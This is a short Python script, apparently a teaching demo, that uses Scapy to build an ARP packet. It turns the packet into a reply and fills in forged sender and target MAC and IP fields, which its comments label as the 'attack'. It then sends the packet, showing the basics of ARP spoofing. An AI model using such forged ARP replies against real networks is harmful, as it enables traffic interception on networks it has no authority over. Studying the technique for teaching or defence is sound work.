from scapy.all import *
import time

#Declaring an arp packet
packet = ARP()
# This will show the default packet with source ip and mac of the client.
print('\nThis will show the default packet with source ip and mac of the client.\n\n')

packet.display()
time.sleep(1)

#Now setting the arp op code to 2 | ARP Reply
packet.op = 2

print('-------------------\nChanged the ARP code, i.e. op from who-has to is-at\n\n')

packet.display()
time.sleep(1)

#Changing values to attack
print('-------------------\nChanging values to attack, notice the change in other fields of ARP\n\n')


packet.hwsrc = '11:11:11:11:11:11'
packet.psrc = '1.1.1.1'
packet.hwdst = '22:22:22:22:22:22'
packet.pdst = '2.2.2.2'
print('-------------------\nNotice the change in other fields of ARP\n\n')

packet.display()
time.sleep(1)

print(send(packet))
